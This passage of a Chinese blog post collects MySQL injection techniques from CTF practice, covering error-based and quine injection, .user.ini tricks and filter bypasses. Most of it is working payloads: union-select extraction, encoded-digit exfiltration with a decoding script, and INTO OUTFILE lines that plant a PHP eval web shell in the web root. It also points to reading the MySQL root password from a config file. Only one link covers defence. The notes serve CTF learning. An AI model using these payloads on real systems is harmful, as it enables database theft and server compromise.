<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">SELECT</span> <span class="token operator">*</span> <span class="token keyword">from</span> <span class="token keyword">user</span> <span class="token keyword">LIMIT</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span> <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> <span class="token keyword">user</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<h2 id="procedure-analyse-函数"><a href="#procedure-analyse-函数" class="headerlink" title="procedure analyse()函数"></a>procedure analyse()函数</h2><blockquote>
<p>是MySQL提供的一个分析结果集的接口，以帮助提供数据类型优化建议</p>
</blockquote>
<p><img src="/blog/2023/03/16/mysql%E6%B3%A8%E5%85%A5/image-20230814120752261.png" alt="image-20230814120752261"></p>
<p>它会给出这个表上的详细统计信息</p>
<h2 id="报错注入法"><a href="#报错注入法" class="headerlink" title="报错注入法"></a>报错注入法</h2><p>payload from p神</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">procedure</span> analyse<span class="token punctuation">(</span>extractvalue<span class="token punctuation">(</span>rand<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>concat<span class="token punctuation">(</span><span class="token number">0x3a</span><span class="token punctuation">,</span><span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<h2 id="时间注入法"><a href="#时间注入法" class="headerlink" title="时间注入法"></a>时间注入法</h2><hr>
<h1 id="finfo文件注入"><a href="#finfo文件注入" class="headerlink" title="finfo文件注入"></a>finfo文件注入</h1><h2 id="finfo类"><a href="#finfo类" class="headerlink" title="finfo类"></a>finfo类</h2><p><a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/function.finfo-file.php">官方文档</a></p>
<p>其中有方法<code>open</code>，<code>file</code></p>
<p>finfo_open：也就是finfo::open的别名，这个函数的作用是打开一个文件，通常和<code>finfo::file/finfo_file</code>在一起使用</p>
<p>finfo_file：返回一个文件的信息</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            <span class="token delimiter important">?></span></span>'#<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p><img src="/blog/2023/03/16/mysql%E6%B3%A8%E5%85%A5/image-20230819172200713.png" alt="image-20230819172200713"></p>
<p><img src="/blog/2023/03/16/mysql%E6%B3%A8%E5%85%A5/image-20230819172257315.png" alt="image-20230819172257315"></p>
<h2 id="user-ini和短标签绕过"><a href="#user-ini和短标签绕过" class="headerlink" title=".user.ini和短标签绕过"></a>.user.ini和短标签绕过</h2><blockquote>
<p>ctfshow web243</p>
</blockquote>
<p>过滤php的情况下，就按照文件上传的几个trick来打就行</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">filename<span class="token operator">=</span><span class="token number">1.</span>txt<span class="token string">' FIELDS TERMINATED BY '</span><span class="token operator">&lt;</span>?<span class="token operator">=</span>eval<span class="token punctuation">(</span>$_POST<span class="token punctuation">[</span><span class="token string">"cmd"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>?<span class="token operator">></span>'<span class="token comment">#</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>因为.user.ini是配置文件，所以我们可以构造<code>;</code>和换行符<code>%0a</code>来注释多余字符</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">filename<span class="token operator">=</span><span class="token punctuation">.</span><span class="token keyword">user</span><span class="token punctuation">.</span>ini<span class="token string">' lines starting by'</span><span class="token punctuation">;</span><span class="token string">' terminated by '</span><span class="token operator">%</span><span class="token number">0</span>aauto_prepend_file<span class="token operator">=</span><span class="token number">1.</span>txt'<span class="token comment"># </span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>




<hr>
<h1 id="quine注入"><a href="#quine注入" class="headerlink" title="quine注入"></a>quine注入</h1><p>参考<a target="_blank" rel="noopener" href="https://ph0ebus.cn/post/SQL%E6%B3%A8%E5%85%A5%E4%B9%8BQuine%E6%B3%A8%E5%85%A5.html">ph0ebus大佬的博客</a></p>
<blockquote>
<p>自产生程序，不接受输入并输出自己的源代码</p>
</blockquote>
<p>在sql注入中，就是让输入的sql语句与要输出的一致</p>
<p>要实现输入语句与输出语句一致，那就需要用到<code>replace</code>函数进行重复替换</p>
<p>基本形式</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">replace</span><span class="token punctuation">(</span>str<span class="token punctuation">,</span>编码的间隔符<span class="token punctuation">,</span>str<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>其中参数str的形式为</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">replace</span><span class="token punctuation">(</span>间隔符<span class="token punctuation">,</span>编码的间隔符<span class="token punctuation">,</span>间隔符<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>例：间隔符为”<code>.</code>“，编码间隔符为<code>CHAR(46)</code>，这样str就是</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> <span class="token keyword">REPLACE</span><span class="token punctuation">(</span><span class="token string">"."</span><span class="token punctuation">,</span><span class="token keyword">CHAR</span><span class="token punctuation">(</span><span class="token number">46</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token string">"."</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="/blog/2023/03/16/mysql%E6%B3%A8%E5%85%A5/image-20230624184640501.png" alt="image-20230624184640501"></p>
<p>构造出来的结果就是</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> <span class="token keyword">REPLACE</span><span class="token punctuation">(</span><span class="token string">'REPLACE(".",CHAR(46),".")'</span><span class="token punctuation">,</span><span class="token keyword">CHAR</span><span class="token punctuation">(</span><span class="token number">46</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token string">'REPLACE(".",CHAR(46),".")'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="/blog/2023/03/16/mysql%E6%B3%A8%E5%85%A5/image-20230624185624959.png" alt="image-20230624185624959"></p>
<p>但是此时可以发现单双引号还没实现一致</p>
<p>这时候就需要使用<code>REPLACE</code>将<code>str</code>的双引号换成单引号，这样最后就不会出现引号不一致的情况了</p>
<p>因此升级版Quine的基本形式，<code>CHAR(34)</code>是双引号，<code>CHAR(39)</code>是单引号</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">REPLACE</span><span class="token punctuation">(</span><span class="token keyword">REPLACE</span><span class="token punctuation">(</span><span class="token string">'str'</span><span class="token punctuation">,</span><span class="token keyword">CHAR</span><span class="token punctuation">(</span><span class="token number">34</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token keyword">CHAR</span><span class="token punctuation">(</span><span class="token number">39</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span>编码的间隔符<span class="token punctuation">,</span><span class="token string">'str'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>升级版str的基本形式</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">REPLACE</span><span class="token punctuation">(</span><span class="token keyword">REPLACE</span><span class="token punctuation">(</span><span class="token string">"间隔符"</span><span class="token punctuation">,</span><span class="token keyword">CHAR</span><span class="token punctuation">(</span><span class="token number">34</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token keyword">CHAR</span><span class="token punctuation">(</span><span class="token number">39</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span>编码的间隔符<span class="token punctuation">,</span><span class="token string">"间隔符"</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<blockquote>
<p>先将str里的双引号替换成单引号，再用str替换str里的间隔符</p>
</blockquote>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> <span class="token keyword">replace</span><span class="token punctuation">(</span><span class="token keyword">replace</span><span class="token punctuation">(</span><span class="token string">'replace(replace(".",char(34),char(39)),char(46),".")'</span><span class="token punctuation">,</span><span class="token keyword">char</span><span class="token punctuation">(</span><span class="token number">34</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token keyword">char</span><span class="token punctuation">(</span><span class="token number">39</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token keyword">char</span><span class="token punctuation">(</span><span class="token number">46</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token string">'replace(replace(".",char(34),char(39)),char(46),".")'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="/blog/2023/03/16/mysql%E6%B3%A8%E5%85%A5/image-20230624205209275.png" alt="image-20230624205209275"></p>
<hr>
<h1 id="限制绕过"><a href="#限制绕过" class="headerlink" title="限制绕过"></a>限制绕过</h1><h2 id="位数长度不足"><a href="#位数长度不足" class="headerlink" title="位数长度不足"></a>位数长度不足</h2><p>使用截断函数</p>
<ul>
<li><strong>substr()函数</strong></li>
</ul>
<p>​	  <code>substr(string,start,length)</code></p>
<p><img src="/blog/2023/03/16/mysql%E6%B3%A8%E5%85%A5/image-20221207161642898.png" alt="1"></p>
<ul>
<li><p><strong>left()函数</strong></p>
<p>获得源字符串左边的子串</p>
<p><code>left(string,n)</code></p>
</li>
<li><p><strong>right()函数</strong></p>
<p>获得字符串右边的子串</p>
<p><code>right(string,n)</code></p>
</li>
<li><p><strong>mid()函数</strong></p>
<p>返回字符串的子串（类似substr）</p>
<p><code>mid(string,start,length)</code></p>
</li>
<li><p><strong>reverse()函数</strong></p>
</li>
</ul>
<hr>
<h2 id="输入过滤"><a href="#输入过滤" class="headerlink" title="输入过滤"></a>输入过滤</h2><ol>
<li><p>空格：<code>/**/</code>、<code>%09</code>、<code>%0a</code>、<code>%0d</code>、<code>%0c</code>、<code>+</code>、<code>%a0</code></p>
<p>以上全部过滤：直接用括号或反引号闭合</p>
<p>如<code>-1&#39;||column_name=&#39;flag</code>或<code>-1&#39;or(username)=&#39;flag</code></p>
</li>
<li><p>等号：like</p>
</li>
<li><p>逗号：针对需要使用<code>substr</code>、<code>limit</code>、<code>mid</code>等函数的情况，<a target="_blank" rel="noopener" href="https://www.jianshu.com/p/d10785d22db2">https://www.jianshu.com/p/d10785d22db2</a></p>
</li>
</ol>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> substr<span class="token punctuation">(</span><span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">from</span> <span class="token number">1</span> <span class="token keyword">for</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">select</span> <span class="token function">mid</span><span class="token punctuation">(</span><span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">from</span> <span class="token number">1</span> <span class="token keyword">for</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span>     <span class="token comment">#等价于</span>
<span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> <span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">)</span>a <span class="token keyword">join</span> <span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token number">2</span><span class="token punctuation">)</span>b

<span class="token keyword">select</span> ascii<span class="token punctuation">(</span><span class="token function">mid</span><span class="token punctuation">(</span><span class="token keyword">user</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">=</span><span class="token number">80</span>   <span class="token comment">#等价于</span>
<span class="token keyword">select</span> <span class="token keyword">user</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">like</span> <span class="token string">'r%'</span>

<span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> news <span class="token keyword">limit</span> <span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span>
<span class="token comment"># 等价于下面这条SQL语句</span>
<span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> news <span class="token keyword">limit</span> <span class="token number">1</span> <span class="token keyword">offset</span> <span class="token number">0</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<ol start="4">
<li><p>or：<code>||</code></p>
</li>
<li><p>单独select: 大写</p>
</li>
<li><p>select…where…：</p>
<ul>
<li><p>show + datebases &#x2F; tables &#x2F; columns from table </p>
</li>
<li><p>将 select * from 列名 进行16进制编码</p>
</li>
<li><p><strong>handler</strong>:一行一行显示库中内容</p>
<p><img src="/blog/2023/03/16/mysql%E6%B3%A8%E5%85%A5/image-20230815205244766.png" alt="image-20230815205244766"></p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">handler</span> table_name <span class="token keyword">open</span> <span class="token keyword">as</span> <span class="token identifier"><span class="token punctuation">`</span>a<span class="token punctuation">`</span></span><span class="token punctuation">;</span><span class="token punctuation">(</span><span class="token identifier"><span class="token punctuation">`</span>a<span class="token punctuation">`</span></span>为新创建的表<span class="token punctuation">)</span>
<span class="token keyword">handler</span> table_name <span class="token keyword">read</span><span class="token punctuation">;</span>读出什么输出什么

<span class="token keyword">handler</span> tablename <span class="token keyword">read</span> <span class="token keyword">first</span> <span class="token punctuation">[</span><span class="token keyword">where</span> username<span class="token operator">=</span>‘admin’<span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token keyword">handler</span> <span class="token identifier"><span class="token punctuation">`</span>a<span class="token punctuation">`</span></span> <span class="token keyword">read</span> <span class="token keyword">next</span> <span class="token punctuation">[</span><span class="token keyword">where</span> username<span class="token operator">=</span>‘admin’<span class="token punctuation">]</span><span class="token punctuation">;</span> – <span class="token punctuation">[</span><span class="token punctuation">]</span> 中的内容意味着可加可不加<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre></li>
</ul>
</li>
</ol>
<ul>
<li><p>单字段过滤：16进制编码<code>hex(a.username)</code></p>
</li>
<li><p>过滤payload中的引号：</p>
<p><code>unhex()</code>和<code>hex()</code>组合绕过</p>
<p>‘abc’ 等价于<code>unhex(hex(6e6+382179))</code>; 可以用于绕过大数过滤（大数过滤：<code>/\d&#123;9&#125;|0x[0-9a-f]&#123;9&#125;/i</code>）<br>具体转换的步骤是：</p>
<ol>
<li>abc转成16进制是616263</li>
<li>616263转十进制是6382179</li>
<li>用科学计数法表示6e6+382179 </li>
<li>套上unhex(hex())，就是unhex(hex(6e6+382179));</li>
</ol>
</li>
<li><p>过滤数字：</p>
<p>用别的字符替换数字然后再转换回去</p>
</li>
</ul>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token operator">-</span><span class="token number">1</span><span class="token string">'union select replace(replace(replace(replace(replace(replace(replace(replace(replace(replace(hex(password),'</span><span class="token number">1</span><span class="token string">','</span>arc<span class="token string">'),'</span><span class="token number">2</span><span class="token string">','</span>brc<span class="token string">'),'</span><span class="token number">3</span><span class="token string">','</span>crc<span class="token string">'),'</span><span class="token number">4</span><span class="token string">','</span>drc<span class="token string">'),'</span><span class="token number">5</span><span class="token string">','</span>erc<span class="token string">'),'</span><span class="token number">6</span><span class="token string">','</span>frc<span class="token string">'),'</span><span class="token number">7</span><span class="token string">','</span>grc<span class="token string">'),'</span><span class="token number">8</span><span class="token string">','</span>hrc<span class="token string">'),'</span><span class="token number">9</span><span class="token string">','</span>irc<span class="token string">'),'</span><span class="token number">0</span><span class="token string">','</span>jrc<span class="token string">'),'</span>a<span class="token string">' from table_name where username='</span>flag'<span class="token comment">--+</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>解密脚本</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python">flag<span class="token operator">=</span><span class="token string">'flag'</span>
<span class="token comment">#flag表示number</span>
flag<span class="token operator">=</span>flag<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'arc'</span><span class="token punctuation">,</span><span class="token string">'1'</span><span class="token punctuation">)</span>
flag<span class="token operator">=</span>flag<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'brc'</span><span class="token punctuation">,</span><span class="token string">'2'</span><span class="token punctuation">)</span>
flag<span class="token operator">=</span>flag<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'crc'</span><span class="token punctuation">,</span><span class="token string">'3'</span><span class="token punctuation">)</span>
flag<span class="token operator">=</span>flag<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'drc'</span><span class="token punctuation">,</span><span class="token string">'4'</span><span class="token punctuation">)</span>
flag<span class="token operator">=</span>flag<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'erc'</span><span class="token punctuation">,</span><span class="token string">'5'</span><span class="token punctuation">)</span>
flag<span class="token operator">=</span>flag<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'frc'</span><span class="token punctuation">,</span><span class="token string">'6'</span><span class="token punctuation">)</span>
flag<span class="token operator">=</span>flag<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'grc'</span><span class="token punctuation">,</span><span class="token string">'7'</span><span class="token punctuation">)</span>
flag<span class="token operator">=</span>flag<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'hrc'</span><span class="token punctuation">,</span><span class="token string">'8'</span><span class="token punctuation">)</span>
flag<span class="token operator">=</span>flag<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'irc'</span><span class="token punctuation">,</span><span class="token string">'9'</span><span class="token punctuation">)</span>
flag<span class="token operator">=</span>flag<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'jrc'</span><span class="token punctuation">,</span><span class="token string">'0'</span><span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>



<p>过滤ASCll码<code>/[\x00-\x7f]/i</code>：</p>
<p>文件包含</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token string">' union select 1,group_concat(password) from table_name into outfile '</span><span class="token operator">/</span>var<span class="token operator">/</span>www<span class="token operator">/</span>html<span class="token operator">/</span><span class="token number">1.</span>txt<span class="token string">'-- -
将flag写入1.txt文件中

-1'</span> <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token string">"&lt;?php eval($_POST[1]);?>"</span> <span class="token keyword">into</span> <span class="token keyword">outfile</span>'<span class="token operator">/</span>var<span class="token operator">/</span>www<span class="token operator">/</span>html<span class="token operator">/</span><span class="token number">1.</span>php
写入一句话木马<span class="token punctuation">(</span>需用base64编码<span class="token operator">+</span>from_base64<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">)</span>
在<span class="token operator">/</span>var<span class="token operator">/</span>www<span class="token operator">/</span>html<span class="token operator">/</span>api<span class="token operator">/</span>config<span class="token punctuation">.</span>php找到mysql的root的密码<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>


<hr>
<h1 id="防御"><a href="#防御" class="headerlink" title="防御"></a>防御</h1><p><a target="_blank" rel="noopener" href="https://www.runoob.com/php/php-mysql-prepared-statements.html">MySQL预处理</a></p>

    </div>
    
    
    
    
    
    
    
</div>

      </div>
    </transition>
    
    <transition name="fade">
      <div id="preview" ref="preview" v-show="previewShow">
        <img id="preview-content" ref="previewContent" />
      </div>
    </transition>
    
  </div>
  <script src="/blog/js/main.js"></script>
  
  




  
  

<div id="vcomments"></div>
<script defer src="/blog/js/lib/valine.min.js" onload="
    new Valine({
        el: '#vcomments',
        app_id: 'U9mZLKunkRUTcBFthjXPjnZE-9Nh9j0Va',
        app_key: 'SzWOnY0PWLGNuL6jW8TZYc7j',
        visitor: 'true',
        placeholder: '写点什么吧(●ˇ∀ˇ●)',
        serverURLs: 'https://u9mzlkun.lc-cn-n1-shared.com',
    });
"></script>


  <footer id="footer">
    <div id="footer-wrap">
        <div>
            &copy;
            2022 - 2026 雲流のLowest World
            <span id="footer-icon">
                <i class="fa-solid fa-font-awesome fa-fw"></i>
            </span>
            &commat;C1oudfL0w0
        </div>
        <div>
            Based on the <a target="_blank" rel="noopener" href="https://hexo.io">Hexo Engine</a> &amp;
            <a target="_blank" rel="noopener" href="https://github.com/argvchs/hexo-theme-particlex">ParticleX Theme</a>
        </div>
        
    </div>
</footer>

<script src="/blog/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"model":{"jsonPath":"/blog/live2dw/assets/z16.model.json"},"display":{"position":"left","width":150,"height":290},"mobile":{"show":false},"log":false,"pluginJsPath":"lib/","pluginModelPath":"assets/","pluginRootPath":"live2dw/","tagMode":false});</script></body>

</html>